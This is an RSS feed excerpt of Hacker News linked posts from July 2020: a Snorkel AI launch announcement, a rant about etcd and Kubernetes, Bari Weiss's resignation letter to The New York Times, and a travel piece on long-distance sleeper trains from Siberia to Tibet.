<h3 id="brb">BRB <a href="#brb" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I’ll put this scene on if I need to step away from the stream for a moment to
use the bathroom or whatever. I added a sound to …</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordanlewis.org/posts/twitch-live-coding/">https://jordanlewis.org/posts/twitch-live-coding/</a></em></p>]]>
            </description>
            <link>https://jordanlewis.org/posts/twitch-live-coding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23834153</guid>
            <pubDate>Tue, 14 Jul 2020 16:38:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snorkel AI: Putting Data First in ML Development]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23834116">thread link</a>) | @vincentschen
<br/>
July 14, 2020 | https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html | <a href="https://web.archive.org/web/*/https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                  <p>
                      Today I’m excited to announce Snorkel AI’s launch out of stealth!
                      Snorkel AI, which spun out of the Stanford AI Lab in 2019, was founded on two simple premises: first, that the labeled <b>training data</b>  machine learning models learn from is increasingly what determines the success or failure of AI applications.
                      And second, that we can do much better than labeling this data entirely by hand.
                  </p>
                  <p>
                      At the Stanford AI lab, the Snorkel AI founding team spent over four years developing new <b>programmatic</b> approaches to labeling, augmenting, structuring, and managing this training data.
                      We were fortunate to develop and deploy early versions of our technology with some of the world’s leading organizations like <a href="https://ai.googleblog.com/2019/03/harnessing-organizational-knowledge-for.html">Google</a>, <a href="https://dl.acm.org/doi/abs/10.1145/3329486.3329492">Intel</a>, <a href="https://arxiv.org/abs/1909.05372">Apple</a>, <a href="https://www.sciencedirect.com/science/article/pii/S2666389920300192">Stanford Medicine</a>, resulting in <a href="https://www.snorkel.ai/technology#reference">over thirty-six peer-reviewed publications</a> on our findings; innovations in weak supervision modeling, data augmentation, multi-task learning, and more; inclusion in university computer science curriculums; and deployments in popular products and systems that you’ve likely interacted with in the last few hours.
                  </p>
                  <p>
                      Through all this academic tinkering and industry spelunking, we realized two things: first, that this concept of labeling and building training data programmatically, rather than by hand, had transformational potential to make machine learning more iterative, auditable, faster to deploy, and ultimately, more practical.
                      And second, that these ideas changed not just how you label training data, but so much of the entire lifecycle and pipeline of ML: how knowledge and feedback is injected; how models are constructed, trained, versioned, and monitored; how entire pipelines are developed iteratively; and how the full set of stakeholders in any ML deployment, from subject matter experts to ML engineers, are incorporated into the process.
                  </p>
                  <p>
                      In other words, we saw that this shift to programmatic training data required a top-to-bottom rewrite of the entire ML development and deployment process.
                      With the support of some amazing investors (Greylock, GV, In-Q-Tel, and others) and incredible early customers, we’ve spent the last year doing just this: building and deploying <a href="https://www.snorkel.ai/platform">Snorkel Flow</a>, an end-to-end platform to support this new vision of the ML process.
                  </p>
                  <h2>The Training Data Bottleneck</h2>
                  <p>
                      Snorkel Flow was motivated first and foremost by a growing realization that training data had become the key bottleneck in much of ML pipeline and AI application development.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png"></p><p>
                      <b>Today’s ML successes often rest on a hidden cost: massive, hand-labeled training datasets.</b>
                      In the last decade, we’ve seen a tectonic shift in AI and ML towards powerful but data-hungry representation learning models.
                      These models—often deep learning architectures—are not only more powerful at obviating traditionally manual development tasks like feature engineering and bespoke model design, but also have never been more accessible in the open source.
                      However, there’s no such thing as a free lunch: these models are highly complex, with tens to hundreds of millions of parameters, and they require massive labeled training datasets to learn from.
                      And, other than in special scenarios where labels are naturally derivative of existing processes, these training datasets need to be labeled by hand.
                  </p>
                  <p>
                      <b>The hand-labeled training data interface to ML has enabled tremendous progress, but is also ridiculously broken.</b>
                      Consider a simple example: a legal analyst at a bank wants to train a contract classification model, and wants to inject a simple heuristic into the ML model: that if “employment” is in the title, the contract should be labeled as an “Employment contract.”
                      Simple, right?
                      Not so.
                      Theoretically, to communicate this specific feature to a machine learning model via only labeling individual data points could require thousands of examples (roughly, inversely proportional to the sparsity of the feature space).
                      From this perspective, it’s like playing 20 questions rather than just communicating the answer directly—fine if you have a massive question-answer bank, but otherwise wholly impractical.
                  </p>
                  <p>
                      <b>Manually labeling training data is prohibitively expensive–especially when expertise and privacy are required.</b>
                      Building training datasets often requires <a href="http://nytimes.com/2018/11/25/business/china-artificial-intelligence-labeling.html">armies of human labelers</a> at massive cost and time expense.
                      For example, ImageNet—one of the foundational projects behind ML’s current explosive progress—took <a href="https://qz.com/1034972/the-data-that-changed-the-direction-of-ai-research-and-possibly-the-world/">over two years</a> to create.
                      However, labeling cats, dogs, stop signs, and pedestrians is one thing; labeling data like medical images, legal and financial contracts, government documents, user data, and network data requires <b>stringent privacy protections</b> and <b>subject matter expert labelers</b>.
                      This means for sectors like financial services, government, telecommunications, insurance, healthcare, and more, creating training data (and by extension, using ML) is either a hugely expensive on-premise activity—or more often, one that is just not feasible to tackle, let alone practical.
                  </p>
                  <p>
                      <b>Iterative development is not possible with hand-labeled data.</b>
                      From an engineering and data science perspective, manually labeled training data fundamentally breaks the ability to quickly iterate, which is absolutely essential in real world settings where input data, output goals, and annotation schema change all the time.
                      From a business perspective, training data is an expensive asset that can’t be reused across projects, can often depreciate to worthless overnight due to changing conditions or business goals, and that presents growing risks—everything from <a href="https://web.archive.org/web/20200703104247/https://cloud.google.com/ai-platform/data-labeling/docs">COVID-related delays</a> to <a href="https://www.theverge.com/2018/1/12/16882408/google-racist-gorillas-photo-recognition-algorithm-ai">issues of bias</a>.
                  </p>
                  <h2>A New Input Paradigm for ML: Programming with Data</h2>
                  <p>
                      With Snorkel Flow, rather than needing to hand-label any training data, users develop <b>programmatic operators</b> that label, augment, and build training data to drive the ML development process.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png"></p><p>
                      <b>Programmatically labeling and building training data.</b>
                      With Snorkel Flow, the idea is to instead communicate this domain knowledge directly via a programmatic operator like a <a href="https://papers.nips.cc/paper/6523-data-programming-creating-large-training-sets-quickly">labeling function</a>.
                      For example, our legal analyst could write a labeling function that labels documents as “Employment contracts” if the word “employment” is in the title, and otherwise abstains; or, a range of more complex and powerful labeling functions relying on internal knowlegebases, models, legacy heuristics, and more.
                      This approach of effectively programming ML with data is simple, direct, interpretable, modifiable, and agnostic to the model used (which is especially important given the ongoing Cambrian explosion of powerful new open source model architectures).
                  </p>
                  <p>
                      <b>The directness of rules with the flexibility of ML.</b>
                      Rule-based systems have long been used in industry for certain tasks—as an input, individual rules have the desirable property of being direct and interpretable.
                      However, rules can also be brittle, and lack the robustness, flexibility, and sheer power of ML approaches.
                      With Snorkel Flow, you get the best of both worlds: rules (and other interpretable resources) as inputs, and powerful ML models that generalize beyond these rules as the output.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png"></p><p>
                      <b>A more powerful yet weaker supervision.</b>
                      At the same time that this programmatic supervision is advantageous in several transformational ways, it is also messier and raises fundamental new technical challenges.
                      The labeling functions and other programmatic operators that users write will have varying unknown accuracies and expertise areas, will overlap and disagree with each other, and may be correlated in tangled and unknown ways.
                      We focused on the algorithmic and systems solutions to these issues over <a href="https://www.snorkel.ai/technology">four-plus years of research</a>, showing both empirically and theoretically that with the right techniques, these deep technical challenges can be overcome.
                      The result: training data that is as good as or better than hand-labeled data, and immensely more practical to create and maintain.
                  </p>
                  <p>
                      <b>Beyond labeling: data augmentation, slicing, monitoring, and more.</b>
                      In high-performance production ML, training data is about a lot more than labeling.
                      For example, data augmentation is a cornerstone technique wherein transformed copies of data (e.g. rotated or blurred images) are used to expand the sizes of training datasets, and make resulting models more robust.
                      Slicing or structuring training datasets into more or less important and difficult subsets is also a critical part of managing production ML. 
                      Finally, monitoring and adapting not just models but …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html">https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html</a></em></p>]]>
            </description>
            <link>https://www.snorkel.ai/07-14-2020-snorkel-ai-launch.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23834116</guid>
            <pubDate>Tue, 14 Jul 2020 16:36:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Etcd, or, why modern software makes me sad]]>
            </title>
            <description>
<![CDATA[
Score 1161 | Comments 578 (<a href="https://news.ycombinator.com/item?id=23833362">thread link</a>) | @Spellman
<br/>
July 14, 2020 | https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/ | <a href="https://web.archive.org/web/*/https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <section id="main-content" role="main">
	<article>
		


		<div><p><img alt="etcd icon" src="https://www.roguelazer.com/images/etcd-icon.png"></p>
<p>Once upon a time in 2013, there was a tool called <a href="https://etcd.io/">etcd</a> which was a really lightweight database written
around the <a href="https://web.stanford.edu/~ouster/cgi-bin/papers/raft-atc14">Raft</a> consensus algorithm. This tool was
originally written in 2013 for a <del>bullshit</del> unsuccessful project called <a href="https://coreos.com/os/docs/latest/">CoreOS Container Linux</a> that was
EOL'd several years ago, but that doesn't really matter — etcd was greater than its original use-case. Etcd
provided a convenient and simple set of primitives (set a key, get a key, set-only-if-unchanged, watch-for-changes) with
a drop-dead simple HTTP API on top of them. I have built a number of tools using etcd as a lightweight consensus store
behind them and it's absolutely a pleasure to work with.</p>
<div>
<p>Hello <strong>massive influx of new readers</strong>! I see that some <del>person who's out to get me</del> kind soul has
cross-posted this to Hacker News, Reddit, and a bunch of other sites. Cool! A few things you might want to know <em>before</em>
you send me hate-mail:</p>
<ul>
<li>The word "rant" is right up there in the tags line. This is not meant to be a persuasive argument to the secret cabal
  that controls API design or a nuanced technical comparison article. It's just some off-the-cuff thoughts. Chillax.</li>
<li>If this didn't come across clearly enough in the article: <em>I think etcd is great!</em> I have written a bunch of tools and
  applications on top of it! I think it's a fantastic little dæmon and its API, even the new janky v3 API, is still a
  million times better than ZooKeeper</li>
</ul>
<p>Okay, then. Read on.</p>
</div>
<p>In 2015, an unrelated tool called <a href="https://github.com/kubernetes/kubernetes">Kubernetes</a> was released by Google (but, really, by
Xooglers). I would go so far as to say that Kubernetes (or, as the "cool kids" say, <kbd>k8s</kbd>) is the worst thing to happen to system administration
since <a href="https://www.roguelazer.com/2020/03/systemd/">systemd</a>. It's a comprehensive suite that promises to simplify operating clusters of software and give something like 
the experience of Google's <kbd>borg</kbd> cluster manager. What it really does is:</p>
<ol>
<li>Add hundreds of new failure modes to your software</li>
<li>Move you from writing portable software configuration to writing thousands of lines of k8s-specific YAML</li>
<li>Ensnare you in a mesh of questionably-good<sup id="fnref:questionably-good"><a href="#fn:questionably-good">1</a></sup> patterns like containerization and software defined networking</li>
</ol>
<p>If you are running a truly enormous system and want to have off-the-shelf orchestration for it, Kubernetes may be
the tool for you. For 99.9% of people out there, it's just an extra layer of complexity that adds almost nothing of
value.</p>
<p>I digress, though; this is a story about etcd. And, unfortunately, our stories come together because Kubernetes was
quickly changed to use etcd as its state store. Thus began the rapid decline of etcd.</p>
<p>With the massive influx of Kubernetes users came, of course, a large number of Xooglers who decided to infect etcd with
Google technologies, as is their way<sup id="fnref:infection"><a href="#fn:infection">2</a></sup><sup id="fnref:who"><a href="#fn:who">3</a></sup>. Etcd's simple HTTP API was replaced by a "gRPC"<sup id="fnref:grpc"><a href="#fn:grpc">4</a></sup> version; the
simple internal data model was replaced by a dense and non-orthogonal data model with different types for leases, locks,
transactions, and plain-old-keys. etcd 3.2 added back a tiny subset of the HTTP API through the <a href="https://etcd.io/docs/v3.4.0/dev-guide/api_grpc_gateway/">"gRPC
Gateway"</a>, but not enough to implement
any of the rich applications built on top of the original API. The v2 API lives on for now, but upstream threatens to
remove it in every new version and there will surely come a time when it'll be removed entirely.</p>
<p>That's it. That's the story. Popular modern technology is taken over by expats from a megacorp and made worse in the
service of a hyper-specialized (and just plain over-hyped) orchestration platform. That's the world today. Anything that
has a simple and elegant feature-set ends up coöpted by people who just want to build big ungainly architecture and ends
up inheriting features from whatever megacorp the coöpters came from<sup id="fnref:megacorp"><a href="#fn:megacorp">9</a></sup>. The software development world would
prefer to use their multi-gigabyte IDEs running on ElectronJS to build thousand-dependency Java applications targeting
ungainly APIs on hard-to-operate systems than support something simpler and better. Quality is, alas, a dying art.</p>
</div>
<hr>
<h2>Comments</h2>


	</article>
    </section>
</div></div>]]>
            </description>
            <link>https://www.roguelazer.com/2020/07/etcd-or-why-modern-software-makes-me-sad/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23833362</guid>
            <pubDate>Tue, 14 Jul 2020 15:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resignation Letter]]>
            </title>
            <description>
<![CDATA[
Score 601 | Comments 614 (<a href="https://news.ycombinator.com/item?id=23833267">thread link</a>) | @kirillzubovsky
<br/>
July 14, 2020 | https://www.bariweiss.com/resignation-letter | <a href="https://web.archive.org/web/*/https://www.bariweiss.com/resignation-letter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-5f0dca0caa6bc4150907a76b"><div><p>Dear A.G.,</p><p>It is with sadness that I write to tell you that I am resigning from The New York Times.&nbsp;</p><p>I joined the paper with gratitude and optimism three years ago. I was hired with the goal of bringing in voices that would not otherwise appear in your pages: first-time writers, centrists, conservatives and others who would not naturally think of The Times as their home. The reason for this effort was clear: The paper’s failure to anticipate the outcome of the 2016 election meant that it didn’t have a firm grasp of the country it covers. Dean Baquet and others have admitted as much on various occasions. The priority in Opinion was to help redress that critical shortcoming.</p><p>I was honored to be part of that effort, led by James Bennet. I am proud of my work as a writer and as an editor. Among those I helped bring to our pages: the Venezuelan dissident Wuilly Arteaga; the Iranian chess champion Dorsa Derakhshani; and the Hong Kong Christian democrat Derek Lam. Also: Ayaan Hirsi Ali, Masih Alinejad, Zaina Arafat, Elna Baker, Rachael Denhollander, Matti Friedman, Nick Gillespie, Heather Heying, Randall Kennedy, Julius Krein, Monica Lewinsky, Glenn Loury, Jesse Singal, Ali Soufan, Chloe Valdary, Thomas Chatterton Williams, Wesley Yang, and many others.</p><p>But the lessons that ought to have followed the election—lessons about the importance of understanding other Americans, the necessity of resisting tribalism, and the centrality of the free exchange of ideas to a democratic society—have not been learned. Instead, a new consensus has emerged in the press, but perhaps especially at this paper: that truth isn’t a process of collective discovery, but an orthodoxy already known to an enlightened few whose job is to inform everyone else.</p><p>Twitter is not on the masthead of The New York Times. But Twitter has become its ultimate editor. As the ethics and mores of that platform have become those of the paper, the paper itself has increasingly become a kind of performance space. Stories are chosen and told in a way to satisfy the narrowest of audiences, rather than to allow a curious public to read about the world and then draw their own conclusions.<strong> </strong>I was always taught that journalists were charged with writing the first rough draft of history. Now, history itself is one more ephemeral thing molded to fit the needs of a predetermined narrative.</p><p>My own forays into Wrongthink have made me the subject of constant bullying by colleagues who disagree with my views. They have called me a Nazi and a racist; I have learned to brush off comments about how I’m “writing about the Jews again.” Several colleagues perceived to be friendly with me were badgered by coworkers. My work and my character are openly demeaned on company-wide Slack channels where masthead editors regularly weigh in. There, some coworkers insist I need to be rooted out if this company is to be a truly “inclusive” one, while others post ax emojis next to my name. Still other New York Times employees publicly smear me as a liar and a bigot on Twitter with no fear that harassing me will be met with appropriate action. They never are.</p><p>There are terms for all of this: unlawful discrimination, hostile work environment, and constructive discharge. I’m no legal expert. But I know that this is wrong.&nbsp;</p><p>I do not understand how you have allowed this kind of behavior to go on inside your company in full view of the paper’s entire staff and the public. And I certainly can’t square how you and other Times leaders have stood by while simultaneously praising me in private for my courage. Showing up for work as a centrist at an American newspaper should not require bravery.</p><p>Part of me wishes I could say that my experience was unique. But the truth is that intellectual curiosity—let alone risk-taking—is now a liability at The Times. Why edit something challenging to our readers, or write something bold only to go through the numbing process of making it ideologically kosher, when we can assure ourselves of job security (and clicks) by publishing our 4000th op-ed arguing that Donald Trump is a unique danger to the country and the world? And so self-censorship has become the norm.</p><p>What rules that remain at The Times are applied with extreme selectivity. If a person’s ideology is in keeping with the new orthodoxy, they and their work remain unscrutinized. Everyone else lives in fear of the digital thunderdome. Online venom is excused so long as it is directed at the proper targets.&nbsp;</p><p>Op-eds that would have easily been published just two years ago would now get an editor or a writer in serious trouble, if not fired. If a piece is perceived as likely to inspire backlash internally or on social media, the editor or writer avoids pitching it. If she feels strongly enough to suggest it, she is quickly steered to safer ground. And if, every now and then, she succeeds in getting a piece published that does not explicitly promote progressive causes, it happens only after every line is carefully massaged, negotiated and caveated.</p><p>It took the paper two days and two jobs to say that the Tom Cotton op-ed “fell short of our standards.” We attached an editor’s note on a travel story about Jaffa shortly after it was published because it “failed to touch on important aspects of Jaffa’s makeup and its history.” But there is still none appended to Cheryl Strayed’s fawning interview with the writer Alice Walker, a proud anti-Semite who believes in lizard Illuminati.&nbsp;</p><p>The paper of record is, more and more, the record of those living in a distant galaxy, one whose concerns are profoundly removed from the lives of most people. This is a galaxy in which, to choose just a few recent examples, the Soviet space program is lauded for its “diversity”; the doxxing of teenagers in the name of justice is condoned; and the worst caste systems in human history includes the United States alongside Nazi Germany.</p><p>Even now, I am confident that most people at The Times do not hold these views. Yet they are cowed by those who do. Why? Perhaps because they believe the ultimate goal is righteous. Perhaps because they believe that they will be granted protection if they nod along as the coin of our realm—language—is degraded in service to an ever-shifting laundry list of right causes. Perhaps because there are millions of unemployed people in this country and they feel lucky to have a job in a contracting industry.&nbsp;</p><p>Or perhaps it is because they know that, nowadays, standing up for principle at the paper does not win plaudits. It puts a target on your back. Too wise to post on Slack, they write to me privately about the “new McCarthyism” that has taken root at the paper of record.</p><p>All this bodes ill, especially for independent-minded young writers and editors paying close attention to what they’ll have to do to advance in their careers. Rule One: Speak your mind at your own peril. Rule Two: Never risk commissioning a story that goes against the narrative. Rule Three: Never believe an editor or publisher who urges you to go against the grain. Eventually, the publisher will cave to the mob, the editor will get fired or reassigned, and you’ll be hung out to dry.</p><p>For these young writers and editors, there is one consolation. As places like The Times and other once-great journalistic institutions betray their standards and lose sight of their principles, Americans still hunger for news that is accurate, opinions that are vital, and debate that is sincere. I hear from these people every day. “An independent press is not a liberal ideal or a progressive ideal or a democratic ideal. It’s an American ideal,” you said a few years ago. I couldn’t agree more. America is a great country that deserves a great newspaper.&nbsp;</p><p>None of this means that some of the most talented journalists in the world don’t still labor for this newspaper. They do, which is what makes the illiberal environment especially heartbreaking. I will be, as ever, a dedicated reader of their work. But I can no longer do the work that you brought me here to do—the work that Adolph Ochs described in that famous 1896 statement: “to make of the columns of The New York Times a forum for the consideration of all questions of public importance, and to that end to invite intelligent discussion from all shades of opinion.”</p><p>Ochs’s idea is one of the best I’ve encountered. And I’ve always comforted myself with the notion that the best ideas win out. But ideas cannot win on their own. They need a voice. They need a hearing. Above all, they must be backed by people willing to live by them.&nbsp;</p><p>Sincerely,</p><p>Bari </p></div></div></div></div>]]>
            </description>
            <link>https://www.bariweiss.com/resignation-letter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23833267</guid>
            <pubDate>Tue, 14 Jul 2020 15:43:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From Siberia to Tibet: Life on a Train]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23832549">thread link</a>) | @9nGQluzmnq3M
<br/>
July 14, 2020 | https://driftingclouds.net/2018/07/04/from-siberia-to-tibet-life-on-a-train/ | <a href="https://web.archive.org/web/*/https://driftingclouds.net/2018/07/04/from-siberia-to-tibet-life-on-a-train/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-494">
	<!-- .entry-header -->

	
		<div>
			
<div data-original-width="636" data-carousel-extra="{&quot;blog_id&quot;:40678465,&quot;permalink&quot;:&quot;https:\/\/driftingclouds.net\/2018\/07\/04\/from-siberia-to-tibet-life-on-a-train\/&quot;,&quot;likes_blog_id&quot;:40678465}" itemscope="" itemtype="http://schema.org/ImageGallery"> <div data-original-width="636" data-original-height="533">  <!-- close group --> <div data-original-width="401" data-original-height="533"> <div itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"> <a href="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_065136.jpg" itemprop="url"> <meta itemprop="width" content="397"> <meta itemprop="height" content="529"> <img data-attachment-id="503" data-orig-file="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_065136.jpg" data-orig-size="3024,4032" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 2&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1531032696&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.442&quot;,&quot;iso&quot;:&quot;50&quot;,&quot;shutter_speed&quot;:&quot;0.004403&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_20180708_065136" data-image-description="" data-medium-file="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_065136.jpg?w=225" data-large-file="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_065136.jpg?w=636" src="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_065136.jpg?w=397&amp;h=529" width="397" height="529" data-original-width="397" data-original-height="529" itemprop="http://schema.org/image" title="img_20180708_065136" alt="img_20180708_065136"> </a> </div> </div> <!-- close group --> </div> <!-- close row --> </div>
<p>Many writers wax lyrical about the romance of long-distance train travel, but on this trip I sampled four them — Irkutsk to Ulaanbaatar, Ulaanbaatar to Beijing, Beijing to Xi’an, and Xining to Lhasa — and the sad truth is that the passenger trains in these parts are strictly utilitarian workhorses, inferior to airplanes on virtually every measure of speed or comfort.&nbsp; &nbsp;Here’s the lowdown on life in a 4-berth sleeper (<em>kupé</em> in Russia, 软卧 <em>ruǎnwò&nbsp;</em>in China).</p>
<h2>Eat</h2>

<p>When you’re on a train for 24 hours or more, you’ve got to eat something, and this leaves you with three options.</p>
<p>The first and most obvious option is <strong>restaurant cars</strong>, and the Mongolian ones with their intricate wood carvings and embroidered tablecloths even look quite attractive.&nbsp; Alas, the food they serve ranges&nbsp;from bland but edible, like our Chinese breakfast set composed mostly of sausage, celery and chilli, to bland and near-inedible, such as the&nbsp;<em>incredibly&nbsp;</em>gristly beef served on the Mongolian train — I was picking bits out of my teeth for the next two days.&nbsp; Perhaps we should have taken the hint from the plastic bags of frozen beef sitting in the corridor, tenderizing in the midsummer heat of the Gobi Desert.</p>
<p>Alternatively, you can try to buy food on <strong>station platforms</strong>, but this presents a number of practical problems.&nbsp; First, stops are few and far between and rarely aligned with mealtimes.&nbsp; Second, stops are short and on arrival you neither have any idea what the options are nor where to find them.&nbsp; Third, if you do find something food-like, it’s often unclear how many days those mince-meat&nbsp;<em>khuushuurs</em>&nbsp;sitting on a table&nbsp;have been fermenting under the Mongolian sun.&nbsp; We did manage to swing some pretty decent&nbsp;<em>piroshki </em>pastries&nbsp;in Ulan-Ude, plus rye bread and boiled eggs in Mongolia, but it really is the luck of the draw and you can’t count on finding more than packaged snacks this way.</p>

<p>Finally, you can <strong>bring your own food</strong>, but with no refrigeration or heating available (aside from hot water), you’ll be hard pressed to expand your culinary horizons beyond packaged bread, instant noodles and the giant Russian rye croutons called&nbsp;<a href="http://snackproduction.com.ua/grenki-3/"><em>grenki</em></a>.&nbsp; (Best flavor: garlic with garlic dip.&nbsp; You’re welcome.)&nbsp; A useful compromise is to buy a meal at your&nbsp;<em>departure&nbsp;</em>station: you’re not going to find much more than fast food, but even KFC is likely tastier, cheaper and healthier than the alternatives.</p>
<p>All that said, you <em>can</em> generally rely on the restaurant cars to supply lukewarm beer at only mildly extortionate prices, which brings me to…</p>
<h2>Drink</h2>

<p>Russian and Mongolian trains forbid drinking <strong>alcoholic beverages</strong> on board; fortunately, this being Russia and Mongolia, beer is not considered alcohol.&nbsp; (Seriously.)&nbsp; Needless to say, this rule is widely ignored by all and sundry, although it’s generally wise to close your compartment door if you have one and avoid tippling at times when conductors are on the prowl.</p>
<p>The one free drink provided in abundant quantities is <strong>boiling hot water</strong>, supplied by a coal or wood fired boiler at the end of each carriage.&nbsp; If you’re lucky, there may even be a thermos bottle in your cabin, which you can use to stock your own supply.&nbsp; Bring along some teabags, instant coffee or cocoa, and you can stay caffeinated.&nbsp; A&nbsp;pedantic nit: most travelers call these <a href="https://en.wikipedia.org/wiki/Samovar">samovars</a>, but in Russian they’re actually “titans” (титан).</p>
<p>Non-hot water, on the other hand, is in distinctly short supply, as the water from the bathroom taps is <strong>not drinkable</strong>.&nbsp; Bring along more than you think you will need, particularly if it’s hot or high outside.&nbsp; As for taking a shower or a bath, forget about it.</p>
<h2>Poop</h2>
<p>Yes, this section has no pictures.&nbsp; (You’re welcome.)</p>
<p>The upside to strictly functional trains is that their toilets are also unencumbered with pneumatic vacuums and mysterious blue liquids.&nbsp; Instead, when you press the lever, the bottom opens up and the contents are deposited straight onto the tracks, followed by a slightly apologetic trickle of water.&nbsp; While this does an admirable job of preventing the toilet from clogging, it does also mean that the doors are locked while the train is stationary, including during those multi-hour border crossings.</p>
<p>On Chinese trains, you will also encounter squat toilets, although there are usually a few thrones to be found as well.&nbsp; The upside to these is that, no matter how filthy the rest of the room, only your feet need make contact; the downside is that whatever your feet make contact with is likely to be unpleasant.&nbsp; This is why everybody on board brings flip-flops to wear.&nbsp; &nbsp;And whether your train is Russian, Mongolian or Chinese, you’ll want to bring toilet paper and soap as well.</p>
<h2>Sleep</h2>
<p>Fed, hydrated and voided, it’s time to sleep.&nbsp;&nbsp;The uninitiated are often tempted by the idea of a hotel on wheels: just slumber away peacefully on board and you’ll arrive at your destination not just refreshed, but having saved on a night’s hotel bill!&nbsp; Reality is more complicated.</p>

<p>Even when not manufactured in the DDR, the berths are <strong>generally uncomfortable</strong>, even in the misnamed Russian “luxe” or Chinese “soft sleeper”.&nbsp; The sheets are nailed to plyboard (we ended up buying an inflatable camping mattress because my dad’s back was wrecked by the four nights of the Moscow-Irkutsk stretch), the blankets are covered in stains of indeterminate origin and getting onto the top bunks requires acrobatics.&nbsp; If the window is closed, it’ll be stuffy and hot inside; if it’s open, every rattle, clank and blast of the horn is amplified and your toes will freeze.&nbsp; &nbsp;While the Trans-Siberian and most railways in China are continuously welded and thus smooth, the Trans-Mongolian is not, meaning your bedtime lullaby will be a constant&nbsp;<em>clunk-clunk, clunk-clunk</em>.</p>
<div data-original-width="636" data-carousel-extra="{&quot;blog_id&quot;:40678465,&quot;permalink&quot;:&quot;https:\/\/driftingclouds.net\/2018\/07\/04\/from-siberia-to-tibet-life-on-a-train\/&quot;,&quot;likes_blog_id&quot;:40678465}" itemscope="" itemtype="http://schema.org/ImageGallery"> <div data-original-width="636" data-original-height="319"> <div data-original-width="424" data-original-height="319"> <div itemprop="associatedMedia" itemscope="" itemtype="http://schema.org/ImageObject"> <a href="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_215106.jpg" itemprop="url"> <meta itemprop="width" content="420"> <meta itemprop="height" content="315"> <img data-attachment-id="513" data-orig-file="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_215106.jpg" data-orig-size="4032,3024" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Pixel 2&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1531086666&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.442&quot;,&quot;iso&quot;:&quot;400&quot;,&quot;shutter_speed&quot;:&quot;0.024963&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_20180708_215106" data-image-description="" data-medium-file="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_215106.jpg?w=300" data-large-file="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_215106.jpg?w=636" src="https://driftingcloudsnet.files.wordpress.com/2018/08/img_20180708_215106.jpg?w=420&amp;h=315" width="420" height="315" data-original-width="420" data-original-height="315" itemprop="http://schema.org/image" title="img_20180708_215106" alt="img_20180708_215106"> </a> </div> </div> <!-- close group -->  <!-- close group --> </div> <!-- close row --> </div>
<p>In addition, <strong>border crossings</strong> are both interminable and inevitably timed to happen in the middle of night.&nbsp; It was past midnight when we finally entered Mongolia after two hours of inspections, and while our arrival into China was at 9 PM, we all had to get off the train and wait for&nbsp;5 hours, until 2 AM, while they swapped the bogies from Russian to Chinese gauge.</p>
